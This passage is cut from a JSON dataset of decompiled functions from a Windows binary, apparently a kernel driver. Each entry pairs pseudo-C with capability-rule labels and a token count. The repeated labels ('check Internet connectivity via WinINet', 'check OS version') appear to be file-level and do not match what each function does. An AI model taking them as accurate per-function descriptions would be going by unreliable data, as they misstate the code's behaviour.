        "token_count": 243
    },
    "00044780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00044780(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    ulong unaff_RBX;\n    int64_t iVar5;\n    uint32_t uVar6;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    \n    if (arg1 != 0) {\n        iVar5 = *(arg1 + 0x10);\n        iVar1 = *(iVar5 + 0x1b0);\n        if ((iVar1 != 0) && (iVar1 != 0x44648)) {\n            *(iVar5 + 0x288) = iVar1;\n            *(iVar5 + 0x1b0) = 0x44648;\n        }\n        iVar1 = *(iVar5 + 0x280);\n        uVar6 = 0xffffffff;\n        if (iVar1 != 0) {\n            if (*0x66230 == 0xffffffff) {\n                piVar4 = *(iVar5 + 400);\n                uVar3 = 0;\n                do {\n                    if (*piVar4 == iVar5) {\n                        *0x66230 = uVar3;\n                        if (uVar3 != 0xffffffff) goto code_r0x00044803;\n                        break;\n                    }\n                    uVar3 = uVar3 + 1;\n                    piVar4 = piVar4 + 1;\n                } while (uVar3 < 0x400);\n            }\n            else {\ncode_r0x00044803:\n                if (iVar1 != 0x443ec) {\n                    *(iVar5 + 0x2a0) = iVar1;\n                    *(iVar5 + 0x280) = 0x443ec;\n                }\n            }\n        }\n        iVar5 = *(iVar5 + 0x10);\n        fcn.00044548(iVar5);\n        if ((((*0x66234 != uVar6) && (arg2 != 0)) && (*0x7b878 == 0)) &&\n           (iVar2 = fcn.00051f30(*(iVar5 + *0x66234 + 0x78), 0x445f0, 0x7b870, *0x66234, unaff_RBX, in_stack_00000000, \n                                 in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, \n                                 in_stack_00000028, in_stack_00000030, in_stack_00000038, in_stack_00000040, \n                                 in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060, \n                                 in_stack_00000068, in_stack_00000070, in_stack_00000078, in_stack_00000080, \n                                 in_stack_00000088, in_stack_00000090),  iVar2 == 0)) {\n            *0x7b878 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 834
    },
    "00044878": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00044878(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    \n    if (arg1 != 0) {\n        iVar1 = *(arg1 + 0x10);\n        if ((*(iVar1 + 0x1b0) != 0) && (*(iVar1 + 0x1b0) == 0x44648)) {\n            *(iVar1 + 0x1b0) = *(iVar1 + 0x288);\n        }\n        if (*(iVar1 + 0x280) != 0) {\n            if (*0x66230 == 0xffffffff) {\n                piVar4 = *(iVar1 + 400);\n                uVar2 = 0;\n                do {\n                    if (*piVar4 == iVar1) {\n                        *0x66230 = uVar2;\n                        if (uVar2 != 0xffffffff) goto code_r0x000448f3;\n                        break;\n                    }\n                    uVar2 = uVar2 + 1;\n                    piVar4 = piVar4 + 1;\n                } while (uVar2 < 0x400);\n            }\n            else {\ncode_r0x000448f3:\n                if (*(iVar1 + 0x280) == 0x443ec) {\n                    *(iVar1 + 0x280) = *(iVar1 + 0x2a0);\n                }\n            }\n        }\n        if (*0x7b878 != 0) {\n            iVar3 = fcn.00052250(0x7b870);\n            *0x7b878 = -(iVar3 != 0) & *0x7b878;\n        }\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "00044d80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00044d80(int32_t *arg1)\n\n{\n    int64_t **arg2;\n    int64_t **ppiVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t *arg2_00;\n    int64_t arg2_01;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t auStackX16 [2];\n    uchar auStackX24 [16];\n    \n    iVar2 = *0x7b8a8;\n    if (*0x7b8a8 != 0) {\n        arg2 = *(arg1 + 2);\n        if (*(arg1 + 10) == '\\0') {\n            iVar6 = 0;\n            iVar4 = 0;\n            iVar5 = 0;\n            for (ppiVar1 = arg2; ppiVar1 != NULL; ppiVar1 = *ppiVar1) {\n                iVar6 = iVar6 + *(ppiVar1 + 5);\n                if (*(ppiVar1 + 5) == 0) {\n                    iVar3 = 1;\n                }\n                else {\n                    iVar3 = (*(ppiVar1 + 0x2c) + *(ppiVar1 + 4) & 0xfff) + 0xfff + *(ppiVar1 + 5) >> 0xc;\n                }\n                iVar4 = iVar4 + iVar3;\n                iVar5 = iVar5 + 1;\n            }\n            arg1[8] = iVar5;\n            arg1[1] = iVar6;\n            *arg1 = iVar4;\n            *(arg1 + 10) = 1;\n        }\n        auStackX16[0] = arg1[1];\n        if ((*(iVar2 + 0x430) == 0x80) || (*(iVar2 + 0x430) == 0x20)) {\n            fcn.0004916c(0);\n            fcn.00031564(iVar2 + 0x438, auStackX24, 0);\n            if (*(iVar2 + 0x420) == 0) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = fcn.000533c8(*(iVar2 + 0x420), arg2, auStackX16[0], auStackX16[0]);\n            }\n            fcn.00031598(iVar2 + 0x438, auStackX24, 0);\n            if (iVar6 != 0) {\n                fcn.00049184(0);\n                if (*arg2 == NULL) {\n                    if ((*(arg2 + 10) & 5) == 0) {\n                        arg2_00 = (**0x114a0)(arg2);\n                    }\n                    else {\n                        arg2_00 = arg2[3];\n                    }\n                    auStackX16[0] = *(arg2 + 5);\n                    if (0xe < auStackX16[0]) {\n                        fcn.00044bac(*(iVar2 + 0x450), arg2_00, 0xe, arg2_00 + 0xe);\n                    }\n                }\n                else {\n                    arg2_01 = fcn.0002fbf0(auStackX16[0]);\n                    if (arg2_01 != 0) {\n                        iVar6 = fcn.00061c30(arg2, 0, arg2_01, 0, auStackX16[0], auStackX16);\n                        if ((iVar6 == 0) && (0xe < auStackX16[0])) {\n                            fcn.00044bac(*(iVar2 + 0x450), arg2_01, 0xe, arg2_01 + 0xe);\n                        }\n                        fcn.0002fc50(arg2_01);\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 850
    },
    "00044f44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00044f44(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint uStackX16;\n    ushort uStackX20;\n    uchar auStackX24 [16];\n    \n    iVar1 = fcn.00044a80(arg1, 0, 0x1010102, &uStackX16);\n    fcn.00031564(0x7b290, auStackX24, 1);\n    iVar2 = fcn.00036bf8(arg1 & 0xffffffff, 1);\n    if ((iVar2 != 0) && (*(iVar2 + 0xc) == 0)) {\n        if (iVar1 == 0) {\n            *(iVar2 + 0x14) = uStackX16;\n        }\n        else {\n            uStackX20 = 0;\n            *(iVar2 + 0x14) = 0;\n        }\n        *(iVar2 + 0x18) = uStackX20;\n    }\n    fcn.00031598(0x7b290, auStackX24, 1);\n    return iVar1;\n}\n",
        "token_count": 254
    },
    "00045008": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00045008(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1;\n    int32_t aiStackX8 [2];\n    uchar auStackX16 [24];\n    \n    if (*0x7b88c != '\\0') {\n        *0x7b88c = '\\0';\n        arg1 = 0;\n        do {\n            iVar1 = fcn.0003673c(arg1, aiStackX8);\n            if ((iVar1 == 0) && (aiStackX8[0] == 0)) {\n                fcn.00044988(arg1);\n            }\n            uVar2 = arg1 + 1;\n            arg1 = uVar2;\n        } while (uVar2 < 100);\n        (*_fcn.00011048)(auStackX16, *0x7b890);\n        (**0x110a0)(*0x7b8a0);\n        (**0x11020)(*0x7b898);\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00045504": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00045504(void)\n\n{\n    int32_t iVar1;\n    int64_t arg1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t arg1_00;\n    uchar auStackX8 [32];\n    \n    if (*0x7b88c != '\\0') {\n        arg1_00 = 0;\n        do {\n            fcn.00031564(0x7b290, auStackX8, 0);\n            iVar2 = fcn.00036bf8(arg1_00, 1);\n            if ((iVar2 == 0) || (*(iVar2 + 0xc) != 0)) {\n                fcn.00031598(0x7b290, auStackX8, 0);\n            }\n            else {\n                arg1 = *(iVar2 + 0x450);\n                iVar1 = *(iVar2 + 0x478);\n                uVar3 = *(iVar2 + 0x47c);\n                fcn.00031598(0x7b290, auStackX8, 0);\n                fcn.00044780(arg1, uVar3);\n                if ((arg1 == 0) && (iVar1 != 0)) {\n                    fcn.00045078(arg1_00);\n                }\n            }\n            uVar3 = arg1_00 + 1;\n            arg1_00 = uVar3;\n        } while (uVar3 < 100);\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "000455b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000455b4(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t **ppiVar3;\n    uint32_t auStackX32 [2];\n    int64_t iStack72;\n    uchar auStack64 [8];\n    int64_t **appiStack56 [2];\n    \n    iStack72 = 0;\n    appiStack56[0] = NULL;\n    if (*0x7b88c != '\\0') {\n        uVar1 = fcn.00045078(arg1);\n        if (uVar1 != 0) {\n            return uVar1;\n        }\n        fcn.00031564(0x7b290, auStack64, 0);\n        iVar2 = fcn.00036bf8(arg1 & 0xffffffff, 1);\n        if (((iVar2 == 0) || (*(iVar2 + 0xc) != 0)) || (iVar2 = *(iVar2 + 0x450),  iVar2 == 0)) {\n            fcn.00031598(0x7b290, auStack64, 0);\n            return 0xc000000e;\n        }\n        if ((*0x7b880 == 0) || ((*0x7b880 <= *(iVar2 + 0xa8) && (*(iVar2 + 0xa8) < *0x7b888 + *0x7b880)))) {\n            fcn.00031598(0x7b290, auStack64, 0);\n            if (iVar2 != 0) {\n                (**0x11040)(auStackX32, appiStack56, *0x7b898, arg2, arg3);\n                if ((auStackX32[0] == 0) && ((**0x110a8)(auStackX32, &iStack72),  auStackX32[0] == 0)) {\n                    *(iStack72 + 0x60) = 0;\n                    fcn.0002ed80(iStack72 + 0x68);\n                    for (ppiVar3 = appiStack56[0]; *ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                    }\n                    if (*(iStack72 + 8) == 0) {\n                        *(iStack72 + 0x10) = ppiVar3;\n                    }\n                    *ppiVar3 = *(iStack72 + 8);\n                    *(iStack72 + 8) = appiStack56[0];\n                    *(iStack72 + 0x28) = 0;\n                    (**(iVar2 + 0xa8))(iVar2, &iStack72, 1);\n                    fcn.0002ee4c(iStack72 + 0x68, 0xffffffff);\n                    auStackX32[0] = *(*(iStack72 + 0x2a) + 0x20 + iStack72);\n                }\n                else {\n                    fcn.00031598(0x7b290, auStack64, 0);\n                }\n                if (appiStack56[0] != NULL) {\n                    (**0x11110)(appiStack56[0]);\n                }\n                if (iStack72 != 0) {\n                    fcn.0002edfc(iStack72 + 0x68);\n                    (**0x11060)(iStack72);\n                }\n                return auStackX32[0];\n            }\n            return 0xc0000225;\n        }\n        fcn.00031598(0x7b290, auStack64, 0);\n    }\n    return 0xc0000001;\n}\n",
        "token_count": 811
    },
    "000457e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t fcn.000457e8(ulong arg1, ulong arg2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int16_t *piVar5;\n    ulong arg3;\n    bool bVar6;\n    uchar auStackX24 [16];\n    uchar uStack1336;\n    uchar auStack1335 [255];\n    ushort uStack1080;\n    uchar auStack1078 [508];\n    ushort uStack570;\n    ushort uStack568;\n    uchar auStack566 [518];\n    ulong var_1h;\n    \n    uStack1336 = 0;\n    fcn.00061a56(auStack1335, 0, 0xff);\n    uStack568 = 0;\n    fcn.00061a56(auStack566, 0, 0x1fe);\n    uStack1080 = 0;\n    fcn.00061a56(auStack1078, 0);\n    fcn.00031564(0x7b290, auStackX24, 0);\n    bVar6 = false;\n    iVar3 = fcn.00036bf8(arg1, 1);\n    if (((iVar3 == 0) || (*(iVar3 + 0x21a) == 0x24)) || (*(iVar3 + 0xc) != 0)) {\n        arg3 = 0;\n    }\n    else {\n        fcn.0002ed80(iVar3 + 0x460);\n        iVar4 = -1;\n        piVar5 = iVar3 + 0x21a;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n        } while (iVar1 != 0);\n        if (iVar4 == -2) {\n            fcn.00031598(0x7b290, auStackX24, 0);\n            return -0x3fffffff;\n        }\n        *(iVar3 + 0x480) = 0xffffffff;\n        *(iVar3 + 0x430) = 9;\n        fcn.00031598(0x7b290, auStackX24, 0);\n        iVar2 = fcn.00045078(arg1);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        if (arg2 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.00044a80(arg1, 0, 0x1010d, &uStack1336);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        fcn.00031564(0x7b290, auStackX24, 0);\n        iVar3 = fcn.00036bf8(arg1, 1);\n        if (iVar3 != 0) {\n            fcn.00061a3e(&uStack1080, iVar3 + 0x1a);\n            uStack570 = 0;\n            bVar6 = *(iVar3 + 0x21a) == 0x7b;\n        }\n        fcn.00031598(0x7b290, auStackX24, 0);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        if (bVar6) {\n            fcn.00061a0e(&uStack568, 0x100, 0x15b28, &uStack1336, &uStack1080);\n        }\n        else {\n            fcn.00061a0e(&uStack568, 0x100, 0x1195c, &uStack1336);\n        }\n        fcn.00031564(0x7b290, auStackX24, 1);\n        iVar3 = fcn.00036bf8(arg1, 1);\n        if (iVar3 != 0) {\n            fcn.00061a3e(iVar3 + 0x21a, &uStack568, 0x100);\n            *(iVar3 + 0x418) = 0;\n        }\n        arg3 = 1;\n    }\n    fcn.00031598(0x7b290, auStackX24, arg3);\n    return 0;\n}\n",
        "token_count": 978
    },
    "00045b84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00045b84(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t arg1_00;\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    uchar auStackX32 [8];\n    \n    if (*0x7b88c == '\\0') {\n        return 0xc0000001;\n    }\n    fcn.00031564(0x7b290, auStackX32, 0);\n    piVar3 = *0x7b280;\n    if (*0x7b280 != NULL) {\n        do {\n            if (((*(piVar3 + 0xc) == 0) && (arg1_00 = piVar3[0x8a],  arg1_00 != 0)) &&\n               ((*(arg1_00 + 0x10) == arg1 || (cVar1 = fcn.00044598(arg1_00, arg1),  cVar1 != '\\0')))) break;\n            piVar3 = *piVar3;\n        } while (piVar3 != NULL);\n        if (piVar3 != NULL) {\n            uVar4 = *(piVar3 + 1);\n            goto code_r0x00045bfe;\n        }\n    }\n    uVar4 = 0;\ncode_r0x00045bfe:\n    fcn.00031598(0x7b290, auStackX32, 0);\n    if (piVar3 == NULL) {\n        return 0xc0000001;\n    }\n    uVar2 = fcn.000455b4(uVar4, arg2, arg3);\n    return uVar2;\n}\n",
        "token_count": 382
    },
    "00045f8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00045f8c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t aiStackX24 [2];\n    uchar auStack152 [128];\n    \n    iVar1 = fcn.0002f718();\n    if (iVar1 < 0x1b) {\n        fcn.00048770(arg1, arg2);\n        do {\n            iVar1 = fcn.000484c8(arg1, arg2, auStack152, 0x80);\n            if (iVar1 != 0) break;\n        } while (aiStackX24[0] != 0);\n        fcn.000471f0(arg1, arg2);\n        iVar1 = fcn.0002f718();\n        if (iVar1 < 0x1b) {\n            (*_fcn.000115b0)(arg2);\n        }\n    }\n    else {\n        do {\n            iVar1 = fcn.0003d934(arg2, auStack152, 0x80, aiStackX24);\n            if (iVar1 != 0) break;\n        } while (aiStackX24[0] != 0);\n        fcn.0003d8c0(arg2);\n    }\n    return;\n}\n",
        "token_count": 275
    },
    "0004609c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0004609c(int64_t arg1, uint64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    uint64_t *puVar6;\n    char *pcVar7;\n    int64_t **ppiVar8;\n    uint32_t uVar9;\n    ulong uVar10;\n    int64_t **in_stack_00000028;\n    int32_t in_stack_00000030;\n    char acStack88 [32];\n    \n    uVar3 = 0;\n    uVar9 = (arg2 & 0xffffffff) >> 5 & 0xfff;\n    if (arg2 == 0) {\n        return 0xc00000f0;\n    }\n    ppiVar8 = NULL;\n    fcn.00030f70(acStack88, 0x11);\n    if (in_stack_00000030 == 0) {\n        uVar3 = (**0x113d0)(0x87c80);\n    }\n    piVar5 = *(*0x7b8b0 + uVar9 * 8);\n    if (piVar5 == NULL) {\ncode_r0x000461a4:\n        piVar5 = fcn.0002fbf0(0x218);\n        if (piVar5 == NULL) {\n            uVar10 = 0xc000009a;\n            goto code_r0x00046266;\n        }\n        fcn.00061a56(piVar5, 0, 0x218);\n        iVar4 = *0x7b8b0;\n        puVar6 = piVar5 + 9;\n        *piVar5 = *(*0x7b8b0 + uVar9 * 8);\n        *(iVar4 + uVar9 * 8) = piVar5;\n        piVar5[6] = arg2;\n        iVar4 = 0xb;\n        do {\n            *puVar6 = arg2;\n            puVar6 = puVar6 + 3;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    else {\n        do {\n            if (piVar5[6] == arg2) break;\n            piVar5 = *piVar5;\n        } while (piVar5 != NULL);\n        if (piVar5 == NULL) goto code_r0x000461a4;\n        puVar6 = piVar5 + 9;\n        piVar5[7] = 0;\n        fcn.00061a56(puVar6, 0, 0x108);\n        fcn.00061a56(piVar5 + 0x2a, 0, 0x4b);\n        fcn.00061a56(piVar5 + 0x19b, 0, 0x4b);\n        piVar5[0x3d] = 0;\n        piVar5[0x3e] = 0;\n        piVar5[0x3f] = 0;\n        *(piVar5 + 0x40) = 0;\n        *(piVar5 + 0x201) = 0;\n        *(piVar5 + 0x204) = 0;\n        iVar4 = 0xb;\n        do {\n            *puVar6 = arg2;\n            puVar6 = puVar6 + 3;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    iVar4 = fcn.00061a38();\n    pcVar7 = acStack88;\n    piVar5[1] = iVar4;\n    do {\n        cVar2 = *pcVar7;\n        pcVar7[piVar5 + (0x10 - acStack88)] = cVar2;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar2 != '\\0');\n    piVar5[5] = arg1;\n    *(piVar5 + 8) = arg3;\n    piVar5[0x3f] = arg4;\n    *(piVar5 + 0x3d) = 0x54694343;\n    piVar5[0x3e] = arg2;\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = piVar5 + 0x3d;\n    }\n    piVar1 = piVar5 + 0x41;\n    uVar10 = 0;\n    piVar5[0x42] = piVar1;\n    *piVar1 = piVar1;\n    ppiVar8 = in_stack_00000028;\ncode_r0x00046266:\n    if (in_stack_00000030 == 0) {\n        (**0x113c0)(0x87c80, ppiVar8 & 0xffffffffffffff00 | uVar3);\n    }\n    return uVar10;\n}\n",
        "token_count": 1108
    },
    "00047278": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00047278(void)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    ulong *puVar8;\n    uint64_t uVar9;\n    uint8_t *arg2;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    uint64_t arg1;\n    uint64_t uVar17;\n    uint8_t auStackX8 [8];\n    ulong uStackX16;\n    uchar auStack120 [16];\n    uchar auStack104 [40];\n    \n    uVar15 = 0;\n    if (*0x7b8b0 != 0) {\n        (*_fcn.00011600)(auStack104, 0, 0);\n        uVar10 = uVar15;\ncode_r0x000472b5:\n        do {\n            uVar3 = (**0x113d0)(0x87c80);\n            for (puVar8 = *(uVar10 + *0x7b8b0); uVar13 = uVar15,  uVar11 = uVar15,  puVar8 != NULL; puVar8 = *puVar8) {\n                if (((puVar8[6] != 0) && (*(puVar8 + 8) == 2)) && (*(puVar8 + 0x156) != 0)) {\n                    uVar11 = puVar8[6];\n                    uVar13 = puVar8[5];\n                    puVar8[6] = 0;\n                    break;\n                }\n            }\n            (**0x113c0)(0x87c80, puVar8 & 0xffffffffffffff00 | uVar3);\n            if (uVar11 != 0) {\n                iVar5 = (**0x114b8)(3, uVar13, 0, 0, 0, 0, 1, auStack104, auStack120);\n                if (iVar5 != 0) {\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x10) = 0;\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -0x45) = 0;\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x48) = 0xf;\n                    *(iVar1 + -0x47) = 6;\n                    *(iVar1 + -0x20) = uVar13;\n                    *(iVar1 + -0x18) = uVar11;\n                    *(iVar1 + -0x40) = 4;\n                    *(iVar1 + -0x38) = 0;\n                    *(iVar1 + -0x30) = 0;\n                    *(iVar1 + -0x28) = 0;\n                    iVar4 = (**0x11108)(uVar13, iVar5);\n                    if (iVar4 == 0x103) {\n                        (*_fcn.00011628)(auStack104, 0, 0, 0, 0);\n                    }\n                }\n                goto code_r0x000472b5;\n            }\n            uVar10 = uVar10 + 8;\n        } while (uVar10 < 0x8000);\n        uStackX16 = 0xffffffffffb3b4c0;\n        (**0x115e0)(0, 0);\n        uVar11 = uVar15;\n        uVar13 = uVar15;\n        uVar17 = uVar15;\n        uVar10 = uVar15;\ncode_r0x000473fc:\n        do {\n            auStackX8[0] = (**0x113d0)(0x87c80);\n            uVar12 = uVar15;\n            uVar14 = uVar15;\n            arg1 = uVar15;\n            for (puVar8 = *(uVar11 + *0x7b8b0); uVar6 = uVar13,  uVar16 = uVar17,  puVar8 != NULL; puVar8 = *puVar8) {\n                uVar14 = uVar15;\n                if ((puVar8[6] != 0) && (*(puVar8 + 8) == 1)) {\n                    piVar7 = puVar8 + 10;\n                    uVar6 = uVar15;\n                    uVar16 = uVar15;\n                    do {\n                        if (*piVar7 != 0) {\n                            uVar12 = puVar8[5];\n                            arg1 = puVar8[6];\n                            uVar14 = puVar8[uVar6 * 3 + 10];\n                            uVar10 = puVar8[uVar6 * 3 + 0xb];\n                            puVar8[uVar6 * 3 + 10] = 0;\n                            uVar13 = uVar6;\n                            uVar17 = uVar16;\n                            if (uVar14 != 0) goto code_r0x00047489;\n                            break;\n                        }\n                        uVar6 = uVar6 + 1;\n                        uVar16 = uVar16 + 1;\n                        piVar7 = piVar7 + 3;\n                        uVar14 = 0;\n                    } while (uVar6 < 0xb);\n                }\n            }\ncode_r0x00047489:\n            uVar9 = puVar8 & 0xffffffffffffff00 | auStackX8[0];\n            (**0x113c0)(0x87c80, uVar9);\n            uVar13 = uVar6;\n            uVar17 = uVar16;\n            if (uVar14 != 0) {\n                iVar5 = (**0x114b8)(3, uVar12, 0, 0, 0, 0, 1, auStack104, auStack120);\n                if (iVar5 != 0) {\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x10) = 0;\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -0x45) = 0;\n                    iVar1 = *(iVar5 + 0xb8);\n                    *(iVar1 + -0x48) = 0xf;\n                    *(iVar1 + -0x47) = 0xb;\n                    *(iVar1 + -0x20) = uVar12;\n                    *(iVar1 + -0x18) = arg1;\n                    *(iVar1 + -0x40) = uVar16;\n                    *(iVar1 + -0x38) = uVar14;\n                    *(iVar1 + -0x30) = uVar10;\n                    iVar4 = (**0x11108)(uVar12, iVar5);\n                    if (iVar4 == 0x103) {\n                        (*_fcn.00011628)(auStack104, 0, 0, 0, 0);\n                    }\n                    arg2 = auStackX8;\n                    iVar5 = fcn.0004633c(arg1, arg2);\n                    if (iVar5 != 0) {\n                        *(iVar5 + 0x50 + uVar6 * 0x18) = 0;\n                        (**0x113c0)(0x87c80, arg2 & 0xffffffffffffff00 | auStackX8[0]);\n                    }\n                }\n                goto code_r0x000473fc;\n            }\n            uVar11 = uVar11 + 8;\n        } while (uVar11 < 0x8000);\n        uVar3 = (**0x113d0)(0x87c80);\n        iVar5 = *0x7b8b0;\n        do {\n            puVar8 = *(iVar5 + uVar15 * 8);\n            while (puVar8 != NULL) {\n                puVar2 = *puVar8;\n                fcn.0002fc50(puVar8);\n                puVar8 = puVar2;\n            }\n            uVar15 = uVar15 + 1;\n        } while (uVar15 < 0x1000);\n        fcn.0002fc50(iVar5);\n        *0x7b8b0 = 0;\n        (**0x113c0)(0x87c80, uVar9 & 0xffffffffffffff00 | uVar3);\n    }\n    return;\n}\n",
        "token_count": 1879
    },
    "0004813c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0004813c(void)\n\n{\n    if (*0x87908 != 0) {\n        *0x87908 = 0;\n        fcn.00047278();\n        if (*0x7b8e8 != 0) {\n            fcn.00016dd4(*0x7b8e8);\n            (*_fcn.000115b0)(*0x7b8e8);\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00048dd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
